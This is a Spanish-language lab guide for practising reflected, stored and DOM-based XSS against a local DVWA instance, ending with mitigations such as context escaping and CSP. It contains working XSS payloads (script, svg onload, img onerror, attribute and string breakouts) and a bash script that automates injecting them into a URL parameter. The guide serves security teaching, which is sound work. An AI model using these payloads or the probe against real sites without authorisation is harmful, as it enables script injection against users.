# DVWA – Cross‑Site Scripting (XSS)

> **Ámbito y ética**: Este material es únicamente para tu laboratorio local (DVWA en tu Kali). No intentes estas técnicas sin autorización explícita.

---

## 1) ¿Qué es XSS?

**Cross‑Site Scripting (XSS)** es una vulnerabilidad que permite inyectar JavaScript (u otros contenidos activos) en páginas vistas por otras personas. Si el navegador del objetivo ejecuta ese código, un atacante puede:

* Robar cookies/sesiones (si no son `HttpOnly`/`SameSite` apropiado).
* Secuestrar la interacción del usuario (clickjacking, keylogging, falsos formularios).
* Pivotar a otras vulnerabilidades del cliente (CSRF, SOP bypass parciales…)

### Tipos

* **Reflected XSS**: la entrada del usuario se refleja **en esa misma respuesta** del servidor.
* **Stored XSS**: la entrada se **almacena** (BD/archivo) y se sirve a **otros usuarios**.
* **DOM‑based XSS**: la inyección ocurre **en el cliente** (JS) al manipular el DOM sin pasar por el servidor.

### Conceptos clave

* **Fuente (source)**: dónde entra el dato (query string, fragment `#`, `postMessage`, `document.referrer`, etc.).
* **Sumidero (sink)**: dónde se inserta sin escapar (p. ej. `innerHTML`, `document.write`, `eval`, handlers como `onload`).
* **Contexto**: **HTML**, **atributo**, **URL/JS**, **CSS**, **JSON/JS**. El payload depende del contexto.

---

## 2) Preparación del laboratorio

* DVWA corriendo en: `http://127.0.0.1:8080/`
* Usuario DVWA: cualquiera válido.
* **DVWA Security**: *Low* para empezar.
* **PHPIDS**: deshabilitado.
* Crea carpeta de evidencias:

```bash
mkdir -p ~/Pentesting/DVWA/xss/{reflected,stored,dom}/evidence
```

Variables útiles de entorno para reutilizar en comandos:

```bash
export DVWA="http://127.0.0.1:8080"
export COOKIE="PHPSESSID=<TU_SESION>; security=low"
```

> 💡 Reemplaza `<TU_SESION>` por tu cookie real tras iniciar sesión en DVWA.

---

## 3) Payloads mínimos por contexto (cheat‑sheet de arranque)

> Estos son **pocs** para probar rápidamente. El contexto real determina cuál funcionará.

* **HTML (body)**:

  ```html
  <script>alert(1)</script>
  ```
* **HTML/atributo** (romper atributo y abrir handler):

  ```html
  " autofocus onfocus=alert(1) x="
  ```
* **HTML/etiqueta SVG** (a menudo menos filtrada):

  ```html
  <svg/onload=alert(1)>
  ```
* **Contexto JS** (cerrar cadena y ejecutar):

  ```js
  ');alert(1);//
  ```
* **URL javascript:** (si el enlace imprime sin validar):

  ```
  javascript:alert(1)
  ```

**URL‑encoding** rápido del payload (útil para `curl`):

```bash
python3 - <<'PY'
import urllib.parse; print(urllib.parse.quote('<script>alert(1)</script>'))
PY
```

---

## 4) Reflected XSS (Low)

### Objetivo en DVWA

`/vulnerabilities/xss_r/`

1. Abre la página y usa el **formulario**. Introduce:

   ```html
   <script>alert('xss-reflected')</script>
   ```

   Si aparece un popup, anota **URL**, **parámetro** y **contexto**.

2. **Evidencia**: captura de pantalla del popup y del HTML (vista código o DevTools).

3. **cURL (opcional)**: descubre el **nombre del parámetro** (DevTools → pestaña Network) y repite con el payload URL‑encodeado. Ejemplo genérico (ajusta `PARAM`):

```bash
curl -s \
  "$DVWA/vulnerabilities/xss_r/?PARAM=%3Cscript%3Ealert(1)%3C%2Fscript%3E" \
  --cookie "$COOKIE" | tee ~/Pentesting/DVWA/xss/reflected/evidence/reflected_response.html
```

> Nota: con `curl` **no verás** el popup, pero puedes confirmar que tu payload vuelve sin escapar en la respuesta.

### Variaciones útiles

* `"><svg/onload=alert(1)>`
* `</script><script>alert(1)</script>` (si estás dentro de `<script>`)
* `';alert(1);//` (si la entrada cae dentro de una cadena JS)

### Qué documentar

* Parámetro vulnerable, contexto, payload efectivo, captura de HTML donde se inserta.

---

## 5) Stored XSS (Low)

### Objetivo en DVWA

`/vulnerabilities/xss_s/`

1. En el formulario de comentarios, en **Name** o **Message** introduce:

   ```html
   <script>alert('xss-stored')</script>
   ```

2. Envía y recarga la página (o entra con otro usuario) → el payload se ejecutará **cada vez** que se renderice el comentario almacenado.

3. **Evidencia**: captura del popup y del comentario guardado con el código inyectado.

### Variaciones

* Usa `SVG` o atributos de evento si `<script>` está filtrado:

  ```html
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)></svg>
  ```

### Qué documentar

* Campo vulnerable (Name/Message), evidencia de persistencia (sigue ejecutando tras recarga), payload.

---

## 6) DOM‑Based XSS (Low)

### Objetivo en DVWA

`/vulnerabilities/xss_d/`

Aquí la vulnerabilidad está en **JavaScript del cliente** (p. ej., usa `location.hash` o parámetros para escribir en `innerHTML`).

1. Abre la página y prueba con un payload en **fragmento** `#` o en el **query string**, dependiendo de la implementación:

   * Variante con **fragmento** (muy común):

     ```
     $DVWA/vulnerabilities/xss_d/#<script>alert('xss-dom')</script>
     ```
   * Variante con **query** (si la página usa `?default=` u otro parámetro):

     ```
     $DVWA/vulnerabilities/xss_d/?default=<script>alert('xss-dom')</script>
     ```

2. Si aparece el popup, confirma en DevTools → **Sources** / **Elements** qué **sink** se usa (`innerHTML`, `document.write`, etc.).

3. **Evidencia**: captura del popup + fragmento/URL utilizada + trozo de JS vulnerable (ver **View Source** de DVWA para este módulo).

### Variaciones

* `#<svg/onload=alert(1)>`
* `?param=';alert(1);//` si cae dentro de JS.

### Qué documentar

* **Fuente** (hash/query), **sumidero** (sink), payload que funciona.

---

## 7) Automatización ligera (opcional)

Script básico para probar un conjunto pequeño de payloads en un **parámetro** concreto (Reflected/DOM con query):

```bash
cat > ~/Pentesting/DVWA/xss/xss_probe.sh <<'BASH'
#!/usr/bin/env bash
set -euo pipefail

if [[ $# -lt 2 ]]; then
  echo "Uso: $0 <url-con-__PARAM__> <cookie>" >&2
  echo "Ej: $0 'http://127.0.0.1:8080/vuln/xss_r/?name=__PARAM__' 'PHPSESSID=...; security=low'" >&2
  exit 1
fi

URL_TEMPLATE="$1"
COOKIE="$2"
OUTDIR="${OUTDIR:-$HOME/Pentesting/DVWA/xss/reflected/evidence}"
mkdir -p "$OUTDIR"

mapfile -t PAYLOADS <<'EOF'
<script>alert(1)</script>
"><svg/onload=alert(1)>
</script><script>alert(1)</script>
';alert(1);//
<img src=x onerror=alert(1)>
EOF

i=0
for p in "${PAYLOADS[@]}"; do
  enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$p'''))")
  url=${URL_TEMPLATE/__PARAM__/$enc}
  resp="$OUTDIR/resp_$((++i)).html"
  echo "[+] Probando: $p"
  curl -s "$url" --cookie "$COOKIE" > "$resp"
  # Heurística: ¿se ve el payload sin escapar?
  if grep -Fq "$p" "$resp"; then
    echo "    [*] Reflejado sin escapar: $resp"
  else
    echo "    [ ] No reflejado literal (revisar contexto/encoding): $resp"
  fi
done
BASH
chmod +x ~/Pentesting/DVWA/xss/xss_probe.sh
```

Uso:

```bash
~/Pentesting/DVWA/xss/xss_probe.sh \
  "$DVWA/vulnerabilities/xss_r/?name=__PARAM__" \
  "$COOKIE"
```

> ⚠️ La detección es heurística: que aparezca el literal no **garantiza** ejecución (depende del contexto). Verifica en el navegador.

---

## 8) Mitigaciones (para escribir en conclusiones)

**Escapado según contexto (server‑side):**

* **HTML**: `htmlspecialchars($v, ENT_QUOTES|ENT_SUBSTITUTE, 'UTF-8')`
* **Atributos**: idem; nunca concatenar sin comillas.
* **JS/JSON embebido**: serializa con `json_encode($v, JSON_HEX_TAG|JSON_HEX_APOS|JSON_HEX_AMP|JSON_HEX_QUOT)` y utiliza el valor **dentro** de una variable, no concatenado en código.
* **URLs**: `urlencode()`/`rawurlencode()` sólo para **componentes** de URL.

**Validación**: permitir sólo lo necesario (lista blanca).

**Cookies**: `HttpOnly`, `Secure`, `SameSite=Lax/Strict`.

**CSP (Content‑Security‑Policy)**: política base que mitigue XSS reflejado/almacenado:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; require-trusted-types-for 'script';
```

(Usar `nonce`/`hash` si hay scripts inline legítimos.)

**DOM seguro**: evitar `innerHTML`/`document.write`; preferir `textContent`, `setAttribute` y plantillas seguras. Si necesitas HTML de usuario, sanitiza con librerías como **DOMPurify**.

---

## 9) Glosario rápido

| Término           | Definición corta                                     | Nota                                                      |
| ----------------- | ---------------------------------------------------- | --------------------------------------------------------- |
| Reflected XSS     | Inyección que se refleja en la misma respuesta.      | Requiere que la víctima haga clic en un enlace malicioso. |
| Stored XSS        | Inyección persistente almacenada y servida a otros.  | Impacto mayor (afecta a todos los que visiten).           |
| DOM‑based XSS     | El JS del cliente crea la inyección al tocar el DOM. | No depende de la respuesta del servidor.                  |
| Fuente (source)   | Lugar donde entra el dato.                           | `location`, formularios, `postMessage`.                   |
| Sumidero (sink)   | Lugar donde se inserta sin escapar.                  | `innerHTML`, `outerHTML`, `eval`, handlers.               |
| Contexto          | Tipo de inserción (HTML/atr/JS/URL/CSS).             | Define el payload adecuado.                               |
| Payload           | El fragmento que prueba/explota la vulnerabilidad.   | POC: `alert(1)`.                                          |
| Escapado/encoding | Transformar caracteres peligrosos.                   | Depende del **contexto**.                                 |
| CSP               | Política del navegador que restringe recursos/JS.    | Mitiga XSS si se configura bien.                          |
| HttpOnly/SameSite | Flags de cookies para reducir robo/CSRF.             | No arreglan XSS, pero limitan impacto.                    |

---

## 10) Lista de verificación (lo mínimo que debes entregar)

* [ ] POC funcional de **Reflected XSS** con evidencia y notas de contexto.
* [ ] POC funcional de **Stored XSS** persistente con evidencia.
* [ ] POC funcional de **DOM‑based XSS** identificando **source** y **sink**.
* [ ] Diferencias entre los tres tipos explicadas en tus palabras.
* [ ] Sección de **mitigaciones** con ejemplos de escapado por contexto.

---

## 11) Siguientes pasos (opcional)

* Repite pruebas en niveles **Medium/High** (DVWA endurece filtros), adapta payloads.
* Prueba **CSP bypass** básicos (si el nivel añade CSP de ejemplo).
* Experimenta con herramientas de apoyo (con cautela en laboratorio): XSStrike, Dalfox.
